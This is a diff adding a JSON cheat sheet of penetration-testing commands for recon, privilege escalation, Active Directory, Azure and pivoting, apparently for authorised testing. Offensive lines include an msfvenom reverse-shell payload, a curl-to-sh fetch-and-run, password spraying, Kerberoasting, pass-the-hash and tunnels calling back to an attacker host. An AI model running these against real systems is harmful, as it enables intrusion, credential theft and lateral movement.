@@ -1,0 +1,290 @@
+[
+  {
+    "category": "recon",
+    "tool": "nmap",
+    "title": "Fast top-1000 TCP scan",
+    "command": "nmap -sV -sC -oA scan/initial <target>",
+    "description": "Service/version detection plus default scripts. -oA saves grepable, normal and XML output at once.",
+    "tags": ["port scan", "tcp", "services", "enumeration"],
+    "output": "Open ports with service, version and any script hits (e.g. 22/tcp open ssh OpenSSH 8.9)."
+  },
+  {
+    "category": "recon",
+    "tool": "nmap",
+    "title": "Full TCP port sweep",
+    "command": "nmap -p- --min-rate 5000 -T4 -oA scan/allports <target>",
+    "description": "All 65535 ports quickly, then re-scan the open ones with -sV -sC for detail.",
+    "tags": ["port scan", "full", "tcp", "all ports"],
+    "output": "Complete list of open TCP ports. Feed these into a targeted second scan."
+  },
+  {
+    "category": "recon",
+    "tool": "nmap",
+    "title": "UDP top ports",
+    "command": "sudo nmap -sU --top-ports 100 -oA scan/udp <target>",
+    "description": "UDP is slow; scan only common ports. Watch for SNMP (161), DNS (53), IKE (500).",
+    "tags": ["udp", "snmp", "dns"],
+    "output": "open|filtered results. Confirm interesting ones with a service-specific tool."
+  },
+  {
+    "category": "recon",
+    "tool": "rustscan",
+    "title": "Rapid port discovery into nmap",
+    "command": "rustscan -a <target> -- -sV -sC",
+    "description": "Very fast port discovery, then pipes into nmap for detail. Good when nmap -p- feels slow.",
+    "tags": ["port scan", "fast", "rust"],
+    "output": "Same nmap detail output, reached far faster on responsive hosts."
+  },
+  {
+    "category": "enumeration",
+    "tool": "gobuster",
+    "title": "Directory brute force",
+    "command": "gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -t 50",
+    "description": "Discover hidden paths. Add -x php,txt,html to probe extensions.",
+    "tags": ["web", "directory", "fuzzing", "http", "brute force"],
+    "output": "Paths with status codes (200, 301, 403). 403 often means it exists but is protected."
+  },
+  {
+    "category": "enumeration",
+    "tool": "gobuster",
+    "title": "Virtual host / subdomain discovery",
+    "command": "gobuster vhost -u http://<target> -w subdomains.txt --append-domain",
+    "description": "Finds virtual hosts served from the same IP. Set the domain in /etc/hosts first.",
+    "tags": ["web", "vhost", "subdomain", "http"],
+    "output": "Discovered vhosts that return a different response size than the baseline."
+  },
+  {
+    "category": "enumeration",
+    "tool": "ffuf",
+    "title": "Parameter fuzzing",
+    "command": "ffuf -u 'http://<target>/page?FUZZ=1' -w params.txt -fs 0",
+    "description": "Discover hidden GET parameters. -fs filters by response size to cut noise.",
+    "tags": ["web", "fuzzing", "parameters", "http"],
+    "output": "Parameter names that change the response, worth testing for injection."
+  },
+  {
+    "category": "enumeration",
+    "tool": "feroxbuster",
+    "title": "Recursive content discovery",
+    "command": "feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
+    "description": "Recursive by default, so it walks into directories it finds. Fast and thorough.",
+    "tags": ["web", "directory", "recursive", "http"],
+    "output": "Tree of discovered paths with status and size, recursing automatically."
+  },
+  {
+    "category": "enumeration",
+    "tool": "enum4linux-ng",
+    "title": "SMB / Samba enumeration",
+    "command": "enum4linux-ng -A <target>",
+    "description": "All-in-one SMB enum: shares, users, groups, password policy, OS info.",
+    "tags": ["smb", "samba", "windows", "shares", "users"],
+    "output": "Domain info, share list, user accounts and the password policy if readable."
+  },
+  {
+    "category": "enumeration",
+    "tool": "crackmapexec",
+    "title": "SMB share and access check",
+    "command": "crackmapexec smb <target> -u '' -p '' --shares",
+    "description": "Null-session share listing. Swap in creds to see what an account can reach.",
+    "tags": ["smb", "shares", "null session", "windows", "cme"],
+    "output": "Shares with READ/WRITE flags per share for the supplied credentials."
+  },
+  {
+    "category": "enumeration",
+    "tool": "ldapsearch",
+    "title": "Anonymous LDAP dump",
+    "command": "ldapsearch -x -H ldap://<target> -b 'dc=domain,dc=local'",
+    "description": "Anonymous bind against a domain controller. Often leaks users and descriptions.",
+    "tags": ["ldap", "active directory", "anonymous", "domain"],
+    "output": "Directory objects. Check description fields for passwords left by admins."
+  },
+  {
+    "category": "exploitation",
+    "tool": "searchsploit",
+    "title": "Find a local exploit",
+    "command": "searchsploit <product> <version>",
+    "description": "Search the offline Exploit-DB mirror. Use -m <id> to copy an exploit locally.",
+    "tags": ["exploit", "exploit-db", "cve", "search"],
+    "output": "Matching exploit titles with their EDB-ID and file path."
+  },
+  {
+    "category": "exploitation",
+    "tool": "hydra",
+    "title": "SSH password spray",
+    "command": "hydra -L users.txt -P passwords.txt ssh://<target> -t 4",
+    "description": "Online brute force. Keep -t low on SSH to avoid lockouts and dropped connections.",
+    "tags": ["brute force", "ssh", "password", "credentials"],
+    "output": "Any valid user:password pairs found. Stop after the first if you only need one."
+  },
+  {
+    "category": "exploitation",
+    "tool": "msfvenom",
+    "title": "Linux reverse shell payload",
+    "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf",
+    "description": "Generate a standalone reverse shell binary. Change -p and -f for other targets.",
+    "tags": ["payload", "reverse shell", "metasploit", "linux"],
+    "output": "An ELF that connects back to your listener when executed on the target."
+  },
+  {
+    "category": "privesc-linux",
+    "tool": "linpeas",
+    "title": "Automated Linux enumeration",
+    "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "description": "Colour-coded local privesc checks. Red/yellow highlights are the highest-value findings.",
+    "tags": ["privilege escalation", "linux", "enumeration", "peass"],
+    "output": "Sections for SUID, cron, capabilities, creds. Focus on the 95%-probability hits."
+  },
+  {
+    "category": "privesc-linux",
+    "tool": "find",
+    "title": "Hunt SUID binaries",
+    "command": "find / -perm -4000 -type f 2>/dev/null",
+    "description": "Lists setuid binaries. Cross-reference anything unusual against GTFOBins.",
+    "tags": ["suid", "privilege escalation", "linux", "gtfobins"],
+    "output": "Full paths of SUID files. A non-standard one is often the escalation path."
+  },
+  {
+    "category": "privesc-linux",
+    "tool": "sudo",
+    "title": "Check sudo rights",
+    "command": "sudo -l",
+    "description": "Shows what the current user may run as another user. Match entries to GTFOBins.",
+    "tags": ["sudo", "privilege escalation", "linux"],
+    "output": "Allowed commands. NOPASSWD entries and editors/interpreters are prime targets."
+  },
+  {
+    "category": "privesc-linux",
+    "tool": "getcap",
+    "title": "Find file capabilities",
+    "command": "getcap -r / 2>/dev/null",
+    "description": "Capabilities can grant privilege without SUID. cap_setuid on an interpreter is a win.",
+    "tags": ["capabilities", "privilege escalation", "linux"],
+    "output": "Files with capabilities set. cap_setuid+ep is the one to look for."
+  },
+  {
+    "category": "privesc-windows",
+    "tool": "winpeas",
+    "title": "Automated Windows enumeration",
+    "command": "winPEASx64.exe",
+    "description": "Windows counterpart to linpeas. Flags misconfigs, stored creds and weak services.",
+    "tags": ["privilege escalation", "windows", "enumeration", "peass"],
+    "output": "Highlighted findings across services, registry, creds and token privileges."
+  },
+  {
+    "category": "privesc-windows",
+    "tool": "whoami",
+    "title": "List token privileges",
+    "command": "whoami /priv",
+    "description": "Shows privileges on the current token. SeImpersonate opens the Potato attack family.",
+    "tags": ["privilege escalation", "windows", "token", "seimpersonate"],
+    "output": "Privilege list with state. Enabled SeImpersonate/SeAssignPrimaryToken are gold."
+  },
+  {
+    "category": "active-directory",
+    "tool": "bloodhound",
+    "title": "Collect AD graph data",
+    "command": "bloodhound-python -u <user> -p <pass> -d domain.local -c all -ns <dc-ip>",
+    "description": "Gathers AD relationships for BloodHound. Import the JSON to map attack paths.",
+    "tags": ["active directory", "bloodhound", "enumeration", "attack path"],
+    "output": "JSON files to drag into the BloodHound GUI to find paths to Domain Admin."
+  },
+  {
+    "category": "active-directory",
+    "tool": "impacket",
+    "title": "Kerberoast service accounts",
+    "command": "impacket-GetUserSPNs domain.local/<user>:<pass> -request -dc-ip <dc-ip>",
+    "description": "Requests TGS tickets for SPN accounts. Crack the hashes offline for service creds.",
+    "tags": ["active directory", "kerberoast", "kerberos", "impacket", "hashes"],
+    "output": "TGS hashes ($krb5tgs$) ready for hashcat mode 13100."
+  },
+  {
+    "category": "active-directory",
+    "tool": "impacket",
+    "title": "AS-REP roast",
+    "command": "impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <dc-ip>",
+    "description": "Targets accounts without Kerberos pre-auth. No password needed to request the hash.",
+    "tags": ["active directory", "asrep", "kerberos", "impacket", "hashes"],
+    "output": "$krb5asrep$ hashes for crackable accounts (hashcat mode 18200)."
+  },
+  {
+    "category": "active-directory",
+    "tool": "impacket",
+    "title": "Pass-the-hash shell",
+    "command": "impacket-psexec -hashes :<nthash> Administrator@<target>",
+    "description": "Authenticate with an NT hash instead of a password. SYSTEM shell via SMB.",
+    "tags": ["active directory", "pass the hash", "lateral movement", "impacket"],
+    "output": "An interactive SYSTEM shell on the target when the hash is valid."
+  },
+  {
+    "category": "cloud-azure",
+    "tool": "az cli",
+    "title": "Enumerate current context",
+    "command": "az account show && az ad signed-in-user show",
+    "description": "Confirms which subscription and identity your token maps to before you touch anything.",
+    "tags": ["azure", "cloud", "enumeration", "context", "identity"],
+    "output": "Subscription, tenant and the signed-in user object — your starting blast radius."
+  },
+  {
+    "category": "cloud-azure",
+    "tool": "az cli",
+    "title": "List readable resources",
+    "command": "az resource list -o table",
+    "description": "Everything your identity can see in the subscription. Roles decide what appears.",
+    "tags": ["azure", "cloud", "resources", "enumeration"],
+    "output": "Resource names, groups and types you have at least Reader on."
+  },
+  {
+    "category": "cloud-azure",
+    "tool": "az cli",
+    "title": "Dump role assignments",
+    "command": "az role assignment list --all -o table",
+    "description": "Maps who has what across the subscription. Look for Owner/Contributor to abuse.",
+    "tags": ["azure", "cloud", "rbac", "roles", "privilege escalation"],
+    "output": "Principal, role and scope rows — the RBAC map for privilege-escalation paths."
+  },
+  {
+    "category": "cloud-azure",
+    "tool": "roadrecon",
+    "title": "Entra ID (Azure AD) recon",
+    "command": "roadrecon auth -u <user> -p <pass> && roadrecon gather",
+    "description": "Pulls the full Entra ID directory into a local DB for offline analysis.",
+    "tags": ["azure", "entra id", "azure ad", "cloud", "enumeration"],
+    "output": "A local database of users, groups, apps and roles to explore with roadrecon gui."
+  },
+  {
+    "category": "cloud-azure",
+    "tool": "azurehound",
+    "title": "Collect Azure attack paths",
+    "command": "azurehound -u <user> -p <pass> list -t <tenant-id> -o output.json",
+    "description": "BloodHound collector for Azure. Reveals paths across identities and resources.",
+    "tags": ["azure", "entra id", "bloodhound", "cloud", "attack path"],
+    "output": "JSON for BloodHound to graph escalation paths through Azure RBAC and Entra roles."
+  },
+  {
+    "category": "pivoting",
+    "tool": "chisel",
+    "title": "Reverse SOCKS proxy",
+    "command": "# attacker\nchisel server -p 8000 --reverse\n# victim\nchisel client <attacker-ip>:8000 R:socks",
+    "description": "Tunnel into internal networks over a SOCKS proxy. Point proxychains at port 1080.",
+    "tags": ["pivoting", "tunnel", "socks", "proxy", "lateral movement"],
+    "output": "A SOCKS5 proxy on the attacker at :1080 reaching the victim's internal network."
+  },
+  {
+    "category": "pivoting",
+    "tool": "ligolo-ng",
+    "title": "Interface-based pivot",
+    "command": "# attacker\nligolo-proxy -selfcert\n# agent\nagent -connect <attacker-ip>:11601 -ignore-cert",
+    "description": "Modern pivoting with a virtual interface — no proxychains, routes feel native.",
+    "tags": ["pivoting", "tunnel", "lateral movement", "ligolo"],
+    "output": "A tun interface you route internal subnets through and reach directly."
+  },
+  {
+    "category": "reporting",
+    "tool": "workflow",
+    "title": "Structure a finding",
+    "command": "Title | Severity (CVSS) | Affected asset | Steps to reproduce | Impact | Remediation | Evidence",
+    "description": "A repeatable skeleton for every finding so reports stay consistent and reviewable.",
+    "tags": ["reporting", "documentation", "workflow", "cvss"],
+    "output": "A finding a client can act on without a follow-up call for clarification."
+  }
+]
